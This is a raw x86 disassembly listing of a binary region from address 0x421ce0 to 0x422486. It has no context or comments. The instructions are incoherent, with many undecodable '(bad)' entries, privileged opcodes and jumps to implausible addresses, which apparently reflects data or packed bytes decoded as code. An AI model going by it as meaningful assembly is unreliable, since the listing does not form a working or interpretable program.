  421ce0:	ins    DWORD PTR es:[edi],dx
  421ce1:	mov    ebp,0x8b0aab6d
  421ce6:	pop    esp
  421ce7:	or     esp,edi
  421ce9:	aad    0xc
  421ceb:	mov    ebp,0xff30745d
  421cf0:	lods   al,BYTE PTR ds:[esi]
  421cf1:	and    edx,eax
  421cf3:	fucomip st,st(3)
  421cf5:	pop    ss
  421cf6:	retf   
  421cf7:	cmp    eax,0x2738950a
  421cfc:	mov    eax,ds:0x1332299
  421d01:	ror    esi,0xac
  421d04:	mov    DWORD PTR [esp+ebx*4-0x196ca237],eax
  421d0b:	jbe    0x421d89
  421d0d:	ins    DWORD PTR es:[edi],dx
  421d0e:	sbb    eax,0xdce8bb85
  421d13:	int3   
  421d14:	dec    esp
  421d15:	xchg   edx,eax
  421d16:	mov    BYTE PTR [edx+0x12],cl
  421d19:	dec    esi
  421d1a:	sub    eax,eax
  421d1c:	retf   
  421d1d:	ficomp WORD PTR [ecx+edi*4-0x7a]
  421d21:	mov    ah,0xe
  421d23:	es jmp 0x41aeb178
  421d29:	xchg   ebp,eax
  421d2a:	mov    bl,0xdb
  421d2c:	xor    edi,esi
  421d2e:	sar    ah,cl
  421d30:	jo     0x421ce2
  421d32:	push   es
  421d33:	push   cs
  421d34:	and    ah,ah
  421d36:	(bad)  
  421d37:	jg     0x421cc7
  421d39:	adc    BYTE PTR [ecx+0x1a],ah
  421d3c:	cmp    esi,esp
  421d3e:	(bad)  
  421d3f:	pop    ecx
  421d40:	and    ebx,DWORD PTR [esi+0x10]
  421d43:	je     0x421d65
  421d45:	xchg   BYTE PTR [bx+0x5b27],cl
  421d4a:	sub    BYTE PTR [esi+0x28],al
  421d4d:	inc    edx
  421d4e:	ret    0x9b52
  421d51:	push   esi
  421d52:	mov    ecx,0x587c3c71
  421d57:	test   eax,0x7f4c017d
  421d5c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d5e:	clc    
  421d5f:	les    ecx,FWORD PTR [ecx-0x23]
  421d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d63:	and    DWORD PTR [eax-0x6f],edi
  421d66:	aad    0x9a
  421d68:	out    dx,eax
  421d69:	and    BYTE PTR [edi-0x14574848],dh
  421d6f:	mov    bh,0x68
  421d71:	add    cl,dl
  421d73:	xchg   BYTE PTR [edi],bl
  421d75:	sub    DWORD PTR [ebx],edx
  421d77:	xor    eax,0xb55d6f7e
  421d7c:	call   0x1cf1:0xb1a01cb8
  421d83:	dec    eax
  421d84:	mov    cl,0x7f
  421d86:	cli    
  421d87:	push   edi
  421d88:	mov    eax,ds:0xfaf44bf0
  421d8d:	push   edx
  421d8e:	xor    BYTE PTR [ecx+esi*4-0x4c51e113],ah
  421d95:	mov    ds:0x31f48506,al
  421d9a:	ins    BYTE PTR es:[edi],dx
  421d9b:	jne    0x421d38
  421d9d:	fdivr  QWORD PTR [ebp-0x3]
  421da0:	add    eax,0xfc123b2b
  421da5:	jg     0x421e06
  421da7:	hlt    
  421da8:	test   al,0x55
  421daa:	mov    cl,0xd3
  421dac:	pop    ds
  421dad:	dec    ebp
  421dae:	fwait
  421daf:	jmp    0x91b46009
  421db4:	bound  ecx,QWORD PTR [ebx+0x72daf201]
  421dba:	out    0xf5,al
  421dbc:	jnp    0x421dfd
  421dbe:	aaa    
  421dbf:	jp     0x421d8f
  421dc1:	ret    0xd199
  421dc4:	push   esi
  421dc5:	jbe    0x421d70
  421dc7:	inc    esi
  421dc8:	and    eax,0xbea13f08
  421dcd:	cmp    eax,DWORD PTR [ebx+0x2410f0e7]
  421dd3:	js     0x421d9d
  421dd5:	shl    DWORD PTR [ebp+esi*4-0x356437a5],1
  421ddc:	sbb    ah,BYTE PTR [ecx+0x50652994]
  421de2:	in     al,0x8f
  421de4:	int    0xed
  421de6:	xchg   ecx,eax
  421de7:	pop    ebp
  421de8:	xchg   edx,eax
  421de9:	sub    al,0x8b
  421deb:	repz out 0x9b,eax
  421dee:	ds das 
  421df0:	stos   DWORD PTR es:[edi],eax
  421df1:	ins    DWORD PTR es:[edi],dx
  421df2:	test   eax,eax
  421df4:	pop    edi
  421df5:	sbb    ecx,ecx
  421df7:	pop    ecx
  421df8:	mov    esi,0xe8fd9849
  421dfd:	dec    esp
  421dfe:	mov    WORD PTR [edx],fs
  421e00:	push   ecx
  421e01:	fbld   TBYTE PTR [edx-0x3a8b2942]
  421e07:	sub    bh,BYTE PTR [edi]
  421e09:	scas   eax,DWORD PTR es:[edi]
  421e0a:	inc    edi
  421e0b:	inc    eax
  421e0c:	clc    
  421e0d:	jmp    0xfba6f368
  421e12:	lods   al,BYTE PTR ds:[esi]
  421e13:	sub    BYTE PTR [edx+0x2a6fe81e],cl
  421e19:	add    eax,DWORD PTR [ecx-0x5]
  421e1c:	jne    0x421dab
  421e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e1f:	popa   
  421e20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e21:	adc    bl,BYTE PTR [ebp+0x2eb64646]
  421e27:	pop    esi
  421e28:	mov    ebx,0x20562656
  421e2d:	fist   WORD PTR [ebx+0x20]
  421e30:	xor    DWORD PTR [eax-0x56],esp
  421e33:	sahf   
  421e34:	imul   esi,ebp,0xfee0489f
  421e3a:	es loope 0x421e69
  421e3d:	adc    DWORD PTR [edi],edi
  421e3f:	push   edi
  421e40:	int    0x2f
  421e42:	bound  ebx,QWORD PTR [eax]
  421e44:	in     al,0xf4
  421e46:	loop   0x421de8
  421e48:	in     eax,dx
  421e49:	(bad)  
  421e4b:	pop    esi
  421e4c:	xchg   DWORD PTR [ecx-0x1],ecx
  421e4f:	mov    BYTE PTR [esi+0xb94bd85],dl
  421e55:	or     esp,DWORD PTR [ecx-0x4f2f13f7]
  421e5b:	xchg   esp,eax
  421e5c:	sbb    eax,0x43d2dc68
  421e61:	adc    esp,DWORD PTR [eax+0x3b]
  421e64:	addr16 pop edi
  421e66:	cmc    
  421e67:	mov    al,ds:0xa350e203
  421e6c:	pop    ebp
  421e6d:	jl     0x421e49
  421e6f:	(bad)  
  421e70:	or     al,0x6
  421e72:	mov    ch,0x55
  421e74:	pop    ds
  421e75:	sti    
  421e76:	test   BYTE PTR [ebx-0x10],0x6c
  421e7a:	ins    DWORD PTR es:[edi],dx
  421e7b:	gs int3 
  421e7d:	push   ecx
  421e7e:	shl    DWORD PTR [esi+0x46331258],cl
  421e84:	add    DWORD PTR ds:0x6d4b6b23,0xffffffb6
  421e8b:	push   edi
  421e8c:	pusha  
  421e8d:	mul    DWORD PTR [edx-0x38]
  421e90:	fwait
  421e91:	stc    
  421e92:	shr    bl,cl
  421e94:	or     ecx,ebp
  421e96:	adc    al,0x80
  421e98:	call   FWORD PTR [esi-0x54]
  421e9b:	dec    esp
  421e9c:	int3   
  421e9d:	mov    DWORD PTR [eax],ebp
  421e9f:	xor    esi,DWORD PTR [eax]
  421ea1:	inc    edx
  421ea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ea3:	xor    eax,0x7a955474
  421ea8:	jbe    0x421f02
  421eaa:	and    eax,0xf63f9bbb
  421eaf:	mov    dh,0x1e
  421eb1:	xchg   esp,eax
  421eb2:	pop    eax
  421eb3:	sar    DWORD PTR [ebp+0x1d],0x0
  421eb7:	xlat   BYTE PTR ds:[ebx]
  421eb8:	sahf   
  421eb9:	and    BYTE PTR [ecx],dl
  421ebb:	push   ebp
  421ebc:	out    0x64,eax
  421ebe:	cld    
  421ebf:	cmp    eax,0x289278b1
  421ec4:	pop    ecx
  421ec5:	sub    edi,edi
  421ec7:	mov    eax,ds:0xdbe92b0d
  421ecc:	ror    dh,cl
  421ece:	mov    ch,0xde
  421ed0:	int    0x42
  421ed2:	add    BYTE PTR [edi-0x5d72153c],bh
  421ed8:	jo     0x421f3e
  421eda:	xor    al,BYTE PTR [edx]
  421edc:	cld    
  421edd:	add    al,0x3b
  421edf:	lods   al,BYTE PTR ds:[esi]
  421ee0:	push   esp
  421ee1:	in     eax,0xbc
  421ee3:	fucomp st(1)
  421ee5:	mov    esp,0x609819c5
  421eea:	push   ebx
  421eeb:	scas   al,BYTE PTR es:[edi]
  421eec:	enter  0x459e,0x65
  421ef0:	faddp  st(1),st
  421ef2:	jmp    0x7fa8:0xf6a77ab4
  421ef9:	or     BYTE PTR [eax+edi*4-0xb6e7522],bl
  421f00:	pushf  
  421f01:	out    0x4a,al
  421f03:	push   eax
  421f04:	outs   dx,BYTE PTR ds:[esi]
  421f05:	mov    ch,0x8f
  421f07:	add    al,0xf3
  421f09:	sub    cl,dh
  421f0b:	mov    ds:0x8180e985,al
  421f10:	mov    edx,0x4da40b87
  421f15:	fdivr  DWORD PTR [eax+ebx*1+0x66387bc1]
  421f1c:	fiadd  DWORD PTR [esp+ebp*4]
  421f1f:	push   0xffffffa0
  421f21:	retf   0xaf86
  421f24:	mov    BYTE PTR [eax],ah
  421f26:	fsubr  DWORD PTR [eax-0x3de10a23]
  421f2c:	(bad)  
  421f2d:	rol    DWORD PTR [ebp-0x4f2692a8],cl
  421f33:	add    al,0x69
  421f35:	jb     0x421ee1
  421f37:	ins    DWORD PTR es:[edi],dx
  421f38:	(bad)  
  421f39:	js     0x421f00
  421f3b:	retf   
  421f3c:	xor    edx,DWORD PTR [ecx]
  421f3e:	pop    ebp
  421f3f:	cmp    eax,DWORD PTR [edx-0x75]
  421f42:	lahf   
  421f43:	mov    ebp,0xfbd5ce8d
  421f48:	fldenv [edi+0x2f]
  421f4b:	inc    ebp
  421f4c:	retf   0xc2e5
  421f4f:	mov    eax,ds:0xff7e238
  421f54:	mov    ebp,0x55352a9e
  421f59:	push   eax
  421f5a:	scas   al,BYTE PTR es:[edi]
  421f5b:	outs   dx,BYTE PTR ds:[esi]
  421f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f5d:	mov    ebx,0x20290a6d
  421f62:	std    
  421f63:	retf   0xde92
  421f66:	jo     0x421efc
  421f68:	push   eax
  421f69:	ss enter 0xd811,0x7f
  421f6e:	push   edx
  421f6f:	jb     0x421ef7
  421f71:	mov    dl,al
  421f73:	cmp    edx,DWORD PTR [edi+eiz*2]
  421f76:	pop    esi
  421f77:	sbb    eax,DWORD PTR [eax-0x13]
  421f7a:	jae    0x421fd0
  421f7c:	cmp    esi,edi
  421f7e:	cli    
  421f7f:	sbb    eax,0x6fa96886
  421f84:	dec    esp
  421f85:	jmp    0x421f29
  421f87:	outs   dx,BYTE PTR ds:[esi]
  421f88:	sub    BYTE PTR [esi-0x3bf95900],0xa5
  421f8f:	or     edi,DWORD PTR [edx+0x11]
  421f92:	retf   
  421f93:	outs   dx,BYTE PTR ds:[esi]
  421f94:	push   ecx
  421f95:	and    BYTE PTR [esi],bl
  421f97:	sti    
  421f98:	inc    edi
  421f99:	dec    esp
  421f9a:	cdq    
  421f9b:	push   ebx
  421f9c:	adc    edx,ebp
  421f9e:	or     ecx,edi
  421fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fa1:	into   
  421fa2:	mov    eax,0xccb9f8b2
  421fa7:	pop    es
  421fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fa9:	pop    edi
  421faa:	push   eax
  421fab:	mov    ebx,esi
  421fad:	dec    edx
  421fae:	lock icebp 
  421fb0:	inc    esp
  421fb1:	sbb    eax,0x1daa7617
  421fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fb7:	lds    esi,FWORD PTR [edx-0x74]
  421fba:	loopne 0x421f89
  421fbc:	imul   edx,DWORD PTR [edx],0x78388b1b
  421fc2:	jle    0x421f67
  421fc4:	in     eax,0x87
  421fc6:	pop    esp
  421fc7:	mov    esi,0x2d74f5d2
  421fcc:	mov    dh,0xcc
  421fce:	jno    0x421fb9
  421fd0:	sahf   
  421fd1:	(bad)  
  421fd2:	mov    WORD PTR [eax-0x43a639a1],?
  421fd8:	inc    ebx
  421fd9:	je     0x422028
  421fdb:	jmp    0x8fc0df28
  421fe0:	push   edi
  421fe1:	or     al,BYTE PTR [ebx+0x47ee8f6]
  421fe7:	adc    ecx,ebx
  421fe9:	dec    eax
  421fea:	popa   
  421feb:	and    eax,0x1ccbbe52
  421ff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ff1:	mov    dh,BYTE PTR [esi-0x7a]
  421ff4:	lock cdq 
  421ff6:	das    
  421ff7:	xchg   ebp,eax
  421ff8:	inc    ebx
  421ff9:	aad    0x8b
  421ffb:	adc    DWORD PTR [edx],0xd0612fde
  422001:	mov    ch,0x77
  422003:	out    0x95,al
  422005:	popf   
  422006:	cmp    dl,BYTE PTR [esi+0x67e70c4b]
  42200c:	out    0x29,eax
  42200e:	add    DWORD PTR [eax],eax
  422010:	adc    BYTE PTR [esi+0x2be64eab],0xc
  422017:	iret   
  422018:	frstor [edx]
  42201a:	rcl    esi,0x33
  42201d:	pop    ds
  42201e:	xor    dl,ch
  422020:	adc    BYTE PTR [edx-0x4af776f1],al
  422026:	or     DWORD PTR [ebp+edx*2-0x7b],0xb2cfc6b7
  42202e:	and    al,0x58
  422030:	pop    edi
  422031:	or     bh,cl
  422033:	xchg   esi,eax
  422034:	pop    ss
  422035:	test   al,0x6a
  422037:	push   ecx
  422038:	int3   
  422039:	xchg   dh,cl
  42203b:	mov    cl,0xeb
  42203d:	mov    ds:0x83ee3566,al
  422042:	jo     0x422041
  422044:	mov    WORD PTR [ebx+0x2841be9c],es
  42204a:	ins    DWORD PTR es:[edi],dx
  42204b:	adc    al,0xdb
  42204d:	cmp    BYTE PTR [esi-0x33c7c8d0],ch
  422053:	scas   eax,DWORD PTR es:[edi]
  422054:	pop    es
  422055:	ja     0x422071
  422057:	aaa    
  422058:	leave  
  422059:	arpl   WORD PTR [ecx-0x5aec6469],sp
  42205f:	add    ch,BYTE PTR [edi+edi*4]
  422062:	xchg   edx,eax
  422063:	xchg   ebp,eax
  422064:	xchg   ebp,eax
  422065:	pop    es
  422066:	adc    esi,DWORD PTR [edi-0x68]
  422069:	mov    esp,ds
  42206b:	xchg   ecx,eax
  42206c:	lahf   
  42206d:	icebp  
  42206e:	leave  
  42206f:	in     al,0xb5
  422071:	outs   dx,BYTE PTR ds:[esi]
  422072:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422073:	das    
  422074:	outs   dx,DWORD PTR ds:[esi]
  422075:	loopne 0x4220b6
  422077:	inc    esi
  422079:	mov    ebp,ebx
  42207b:	cwde   
  42207c:	or     eax,0x45a2209f
  422081:	gs shr esp,1
  422084:	mov    edi,0x67a233f0
  422089:	push   0xda6a969b
  42208e:	and    bl,BYTE PTR [edi+0x17]
  422091:	pop    ds
  422092:	mov    ds:0x8e77020b,al
  422097:	push   ss
  422098:	(bad)  
  422099:	pop    esp
  42209a:	mul    bh
  42209c:	(bad)  
  42209d:	div    DWORD PTR [esi]
  42209f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220a0:	lods   al,BYTE PTR ds:[esi]
  4220a1:	retf   0xed39
  4220a4:	imul   eax,DWORD PTR [edi-0xe],0xffffffd7
  4220a8:	rcl    BYTE PTR [esi-0x478cee32],1
  4220ae:	arpl   WORD PTR [edx+0xae9def2],di
  4220b4:	(bad)  
  4220b5:	jmp    0x422131
  4220b7:	xor    eax,0xb482e289
  4220bc:	sbb    ecx,esp
  4220be:	and    al,0x54
  4220c0:	push   es
  4220c1:	jo     0x422117
  4220c3:	lds    edi,FWORD PTR [ecx]
  4220c5:	daa    
  4220c6:	inc    esi
  4220c7:	xor    ch,BYTE PTR [ebp-0x75d326bb]
  4220cd:	sbb    BYTE PTR [edi+0x5c],bl
  4220d0:	cmp    eax,0x76bfd18
  4220d5:	pop    edi
  4220d6:	mov    WORD PTR gs:[esi+0x5bb96e7a],cs
  4220dd:	inc    eax
  4220de:	stos   DWORD PTR es:[edi],eax
  4220df:	push   ecx
  4220e0:	inc    esp
  4220e1:	jle    0x4220d1
  4220e3:	sti    
  4220e4:	jmp    0x2482c753
  4220e9:	outs   dx,DWORD PTR ds:[esi]
  4220ea:	repnz push ebx
  4220ec:	nop
  4220ed:	xchg   ecx,eax
  4220ee:	stos   BYTE PTR es:[edi],al
  4220ef:	inc    esi
  4220f0:	mov    DWORD PTR [edx+esi*1+0x4a134ede],0x2ec8c08b
  4220fb:	psrlw  mm1,QWORD PTR [ebx+0x57]
  4220ff:	pushf  
  422100:	loope  0x4220c1
  422102:	inc    esi
  422103:	cmp    DWORD PTR [ebx-0x2c],eax
  422106:	nop    edx
  422109:	stos   DWORD PTR es:[edi],eax
  42210a:	xor    eax,0x1879d2f8
  42210f:	outs   dx,DWORD PTR ds:[esi]
  422110:	pop    edx
  422111:	push   0xd340dee4
  422116:	fisub  WORD PTR [ebx]
  422118:	test   DWORD PTR [ebx],edi
  42211a:	pop    edx
  42211b:	outs   dx,BYTE PTR ds:[esi]
  42211c:	add    esp,edi
  42211e:	xchg   esp,eax
  42211f:	or     dh,BYTE PTR [edi-0x30]
  422122:	inc    edx
  422123:	pop    ebx
  422124:	fnstsw WORD PTR [edx+0xff786a1]
  42212a:	mov    ecx,0x41cbf8bc
  42212f:	and    DWORD PTR [edx],ecx
  422131:	scas   al,BYTE PTR es:[edi]
  422132:	inc    edi
  422133:	jge    0x422118
  422135:	dec    esp
  422136:	lods   eax,DWORD PTR ds:[esi]
  422137:	mov    eax,ds:0xf37b153f
  42213c:	sar    BYTE PTR ds:0xdb741d4e,1
  422142:	or     al,0x92
  422144:	and    ch,BYTE PTR [ebp-0x12]
  422147:	sub    eax,edx
  422149:	mov    edx,0x3059ce6
  42214e:	in     eax,0x2f
  422150:	cmp    esi,DWORD PTR [ecx]
  422152:	add    dl,cl
  422154:	popa   
  422155:	js     0x4220d8
  422157:	stc    
  422158:	sahf   
  422159:	shl    BYTE PTR [edx-0x78],cl
  42215c:	cdq    
  42215d:	jns    0x4221d7
  42215f:	push   ecx
  422160:	adc    eax,0x8b3460ba
  422165:	(bad)  
  422166:	aad    0x14
  422168:	(bad)  
  422169:	or     al,0xfe
  42216b:	sub    ebx,ecx
  42216d:	cmp    BYTE PTR [ebx+0x1e34a3ce],cl
  422173:	jns    0x42211f
  422175:	cs adc eax,0xc85c07fb
  42217b:	call   0x13a62ecf
  422180:	or     esp,edx
  422182:	ins    BYTE PTR es:[edi],dx
  422183:	iret   
  422184:	ret    
  422185:	sbb    al,0x9c
  422187:	stc    
  422188:	js     0x422165
  42218a:	mov    ?,esp
  42218c:	and    eax,0xdc55c99b
  422191:	xchg   DWORD PTR [edx],esi
  422193:	jmp    0x42218c
  422195:	shl    DWORD PTR ds:0xe9eba90f,0x85
  42219c:	retf   
  42219d:	dec    ebx
  42219e:	fcom   QWORD PTR [ebx-0x9ff09d9]
  4221a4:	adc    ch,ah
  4221a6:	out    dx,eax
  4221a7:	dec    eax
  4221a8:	and    ebp,DWORD PTR [edx+0x74bbbeaa]
  4221ae:	in     al,0xee
  4221b0:	xchg   edx,eax
  4221b1:	std    
  4221b2:	pop    esi
  4221b3:	add    BYTE PTR [ecx+0x29782c4],dh
  4221b9:	push   ebp
  4221ba:	adc    al,0xf9
  4221bc:	loopne 0x42216e
  4221be:	ss ins DWORD PTR es:[edi],dx
  4221c0:	xlat   BYTE PTR ds:[ebx]
  4221c1:	das    
  4221c2:	test   eax,0x105c929e
  4221c7:	mov    edi,0x1a286232
  4221cc:	popf   
  4221cd:	fadd   QWORD PTR [edi]
  4221cf:	xchg   edx,eax
  4221d0:	inc    ecx
  4221d1:	cmp    eax,0x6b77e910
  4221d6:	cdq    
  4221d7:	jecxz  0x422207
  4221d9:	imul   ebx,DWORD PTR [ebp+ebp*2+0x62],0x7f474d3e
  4221e1:	es push esp
  4221e3:	retf   
  4221e4:	mov    dh,0x16
  4221e6:	mov    eax,ds:0x70a735ed
  4221eb:	xor    eax,0xef50141d
  4221f0:	leave  
  4221f1:	jg     0x42224d
  4221f3:	pop    ss
  4221f4:	sub    eax,0x8dd72510
  4221f9:	jne    0x422206
  4221fb:	stos   BYTE PTR es:[edi],al
  4221fc:	jecxz  0x422206
  4221fe:	xor    eax,0x468099b8
  422203:	jecxz  0x42221f
  422205:	jl     0x42227b
  422207:	mov    ah,BYTE PTR [edi+0x22]
  42220a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42220b:	dec    esp
  42220c:	ss mov dh,bl
  42220f:	push   edx
  422210:	cmp    DWORD PTR [esp+eax*4-0x44a1e150],edi
  422217:	imul   ecx,DWORD PTR [edx-0x291f2e01],0x5cf2c8dd
  422221:	xchg   esi,eax
  422222:	das    
  422223:	stos   BYTE PTR es:[edi],al
  422224:	or     eax,0x31ca34b1
  422229:	jge    0x422220
  42222b:	mov    esp,0xc95d4c8b
  422230:	mov    esp,0xb8d30969
  422235:	leave  
  422236:	mov    ds:0x47eccfdc,al
  42223b:	pop    ebp
  42223c:	retf   0x8294
  42223f:	add    DWORD PTR [ecx-0x127d7ded],esp
  422245:	jae    0x4221ee
  422247:	test   BYTE PTR [eax+0x56c15126],bh
  42224d:	(bad)
  422251:	lods   al,BYTE PTR ds:[esi]
  422252:	bound  ecx,QWORD PTR es:[ecx+0x72]
  422256:	push   0xffffffa6
  422258:	jno    0x422252
  42225a:	cs jns 0x4222c9
  42225d:	ror    DWORD PTR [ecx],1
  42225f:	push   es
  422260:	sub    bl,dl
  422262:	pop    ebx
  422263:	and    al,0xd9
  422265:	push   ebp
  422266:	cmp    ch,bh
  422268:	xor    esp,eax
  42226a:	push   esp
  42226b:	jnp    0x422243
  42226d:	iret   
  42226e:	mov    esi,0x6ae4f86f
  422273:	push   eax
  422274:	add    al,0x42
  422276:	push   ds
  422277:	jmp    0xc8942b7e
  42227c:	gs mov cl,0x7b
  42227f:	cmp    BYTE PTR [edi-0x7740ee09],al
  422285:	mov    edi,eax
  422287:	jmp    0x6974:0xa2cf3e87
  42228e:	push   ss
  42228f:	(bad)  
  422290:	out    0x24,eax
  422292:	and    ebp,ebp
  422294:	dec    ecx
  422295:	adc    al,0xd1
  422297:	pop    es
  422298:	jge    0x422307
  42229a:	js     0x42228e
  42229c:	addr16 leave 
  42229e:	push   esi
  42229f:	(bad)  [ebx]
  4222a1:	xchg   esi,eax
  4222a2:	iret   
  4222a3:	out    dx,al
  4222a4:	bound  eax,QWORD PTR [ecx+eax*2+0x1]
  4222a8:	sub    edx,0xaaa4e922
  4222ae:	add    DWORD PTR [edx-0x1a],eax
  4222b1:	stos   DWORD PTR es:[edi],eax
  4222b2:	inc    ecx
  4222b3:	scas   eax,DWORD PTR es:[edi]
  4222b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222b5:	add    al,0x40
  4222b7:	xchg   edi,eax
  4222b8:	fimul  DWORD PTR [esi]
  4222ba:	test   eax,0x3bdb5a49
  4222bf:	(bad)  [ecx]
  4222c1:	(bad)  
  4222c2:	std    
  4222c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222c4:	jmp    0xae4461c5
  4222c9:	adc    BYTE PTR [esi+edi*1-0x3e],0x49
  4222ce:	xchg   DWORD PTR [eax-0x24],esp
  4222d1:	lods   al,BYTE PTR ds:[esi]
  4222d2:	jnp    0x4222ed
  4222d4:	int3   
  4222d5:	lods   eax,DWORD PTR ds:[esi]
  4222d6:	es and al,0x52
  4222d9:	push   ecx
  4222da:	ror    BYTE PTR [eax],cl
  4222dc:	adc    esi,esp
  4222de:	scas   eax,DWORD PTR es:[edi]
  4222df:	jne    0x422294
  4222e1:	mov    bh,0xe0
  4222e3:	rcr    DWORD PTR [edi-0x23689c79],0xed
  4222ea:	sub    ebx,DWORD PTR [ebp+eax*8-0x4e]
  4222ee:	cmp    BYTE PTR [esi],ch
  4222f0:	push   ebx
  4222f1:	adc    DWORD PTR [ecx+0x18],0xe2ea058
  4222f8:	scas   eax,DWORD PTR es:[edi]
  4222f9:	xchg   edi,eax
  4222fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222fb:	add    al,0x7
  4222fd:	push   ebx
  4222fe:	xor    ebp,DWORD PTR ds:[edi]
  422301:	cmp    al,0x35
  422303:	inc    eax
  422305:	and    DWORD PTR [esi],edx
  422307:	dec    eax
  422308:	push   eax
  422309:	jmp    0x3004:0x80a874e8
  422310:	js     0x422354
  422312:	mov    dh,0x9c
  422314:	push   ss
  422315:	mov    ecx,0x8276582e
  42231a:	daa    
  42231b:	and    BYTE PTR [esi+0x1e5fcd7b],bl
  422321:	add    BYTE PTR [ebx+0x12533ca1],dh
  422327:	jb     0x422325
  422329:	sbb    eax,DWORD PTR [esi+ecx*4-0xadd0e14]
  422330:	push   es
  422331:	js     0x42233c
  422333:	mov    ebx,0xd89026d1
  422338:	mov    WORD PTR [eax+ecx*1],cs
  42233b:	clc    
  42233c:	fnsave [eax-0x4eeda083]
  422342:	shld   DWORD PTR [edx+0x4de148a9],ebx,0xd3
  42234a:	xor    eax,0xd56d1112
  42234f:	push   ss
  422350:	xchg   esi,eax
  422351:	aaa    
  422352:	stc    
  422353:	push   ebx
  422354:	ins    DWORD PTR es:[edi],dx
  422355:	lods   eax,DWORD PTR ds:[esi]
  422356:	lock wrmsr 
  422359:	xor    al,0xd4
  42235b:	arpl   WORD PTR [ecx+edx*2-0x46faeda5],bp
  422362:	pop    es
  422363:	(bad)  
  422364:	(bad)  
  422365:	adc    al,al
  422367:	push   esi
  422368:	sub    DWORD PTR [ebp+0x2c52e188],edx
  42236e:	xor    ah,bh
  422370:	scas   eax,DWORD PTR es:[edi]
  422371:	sub    BYTE PTR [ebx-0x4dbe798c],bh
  422377:	nop
  422378:	jecxz  0x422346
  42237a:	js     0x422387
  42237c:	std    
  42237d:	es ins DWORD PTR es:[edi],dx
  42237f:	in     eax,dx
  422380:	mov    ecx,0x189ce852
  422385:	or     al,ch
  422387:	test   eax,0xf4516e72
  42238c:	or     edi,DWORD PTR [edi-0x7d]
  42238f:	sbb    cl,BYTE PTR [ecx-0x34]
  422392:	mov    esp,0xd4086dcf
  422397:	dec    esi
  422398:	les    eax,FWORD PTR [ebx]
  42239a:	sub    esp,edx
  42239c:	push   ecx
  42239d:	ss out 0x82,eax
  4223a0:	ds inc ebx
  4223a2:	mov    dl,0x91
  4223a4:	repnz test DWORD PTR [edx],ebx
  4223a7:	inc    ecx
  4223a8:	lods   eax,DWORD PTR ds:[esi]
  4223a9:	dec    ebx
  4223aa:	(bad)  
  4223ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223ac:	rcr    BYTE PTR gs:[ecx+ecx*8],1
  4223b0:	retf   0xe843
  4223b3:	(bad)  [edx+ecx*8]
  4223b6:	cmp    ch,dh
  4223b8:	push   ebp
  4223b9:	xchg   DWORD PTR [esi+0x5cf50c23],esi
  4223bf:	ins    DWORD PTR es:[edi],dx
  4223c0:	lds    eax,FWORD PTR [edx+0x290e549a]
  4223c6:	jae    0x422440
  4223c8:	and    DWORD PTR [eax],esi
  4223ca:	cmp    BYTE PTR [eax-0x7f42fa93],ch
  4223d0:	loopne 0x42244f
  4223d2:	or     DWORD PTR [eax],edx
  4223d4:	imul   BYTE PTR [ecx]
  4223d6:	por    mm6,QWORD PTR [eax-0x591775]
  4223dd:	xchg   esi,eax
  4223de:	(bad)  
  4223df:	popf   
  4223e0:	mov    esp,esp
  4223e2:	cli    
  4223e3:	xor    al,0x7
  4223e5:	das    
  4223e6:	cmp    BYTE PTR ds:0xe60083d8,0x37
  4223ed:	cmc    
  4223ee:	push   ds
  4223ef:	call   0xb751:0xb2515587
  4223f6:	push   ecx
  4223f7:	leave  
  4223f8:	jmp    0x422452
  4223fa:	in     al,0x4a
  4223fc:	cmc    
  4223fd:	or     al,0xd6
  4223ff:	sub    al,0xa2
  422401:	or     ah,BYTE PTR [ecx]
  422403:	and    ah,BYTE PTR [esi]
  422405:	xchg   ecx,eax
  422406:	inc    eax
  422407:	sbb    eax,0xed6d42b0
  42240c:	dec    ebp
  42240d:	jne    0x422481
  42240f:	dec    ebx
  422410:	xor    DWORD PTR [edx+0x4583886e],edx
  422416:	push   cs
  422417:	in     al,0x9f
  422419:	mov    al,0x47
  42241b:	sbb    ebp,DWORD PTR [eax]
  42241d:	add    ebx,ecx
  42241f:	mov    ds:0x9c8d5c3b,eax
  422424:	mov    DWORD PTR [ebp-0x13],esi
  422427:	int    0xd8
  422429:	cmc    
  42242a:	push   eax
  42242b:	mov    DWORD PTR ds:0xfe55c503,ebp
  422431:	xchg   edx,eax
  422432:	sbb    al,0x3e
  422434:	sbb    BYTE PTR [eax-0xcc34279],0x56
  42243b:	aam    0x5d
  42243d:	mov    ds:0xdfa25237,eax
  422442:	mov    ecx,0xe8c4c62b
  422447:	pop    es
  422448:	mov    ds:0xd3208331,al
  42244d:	fnsave [eax]
  42244f:	mov    dl,0xd0
  422451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422452:	ret    
  422453:	mov    ch,0x97
  422455:	cmp    BYTE PTR [eax+0x18c5a4bd],al
  42245b:	(bad)  
  42245c:	iret   
  42245d:	fdivr  QWORD PTR [eax]
  42245f:	push   es
  422460:	ins    DWORD PTR es:[edi],dx
  422461:	lahf   
  422462:	les    esi,FWORD PTR [esi+edx*2-0x379a644b]
  422469:	add    ecx,esi
  42246b:	fs add ah,BYTE PTR ss:[ebx-0x655313f7]
  422473:	mov    eax,0x8248726a
  422478:	aam    0xb
  42247a:	mov    esi,0xe9cf9ff4
  42247f:	jo     0x42242f
  422481:	in     al,dx
  422482:	pop    edx
  422483:	push   ebp
  422484:	mov    ch,0xd9
  422486:	mov    bh,0x2
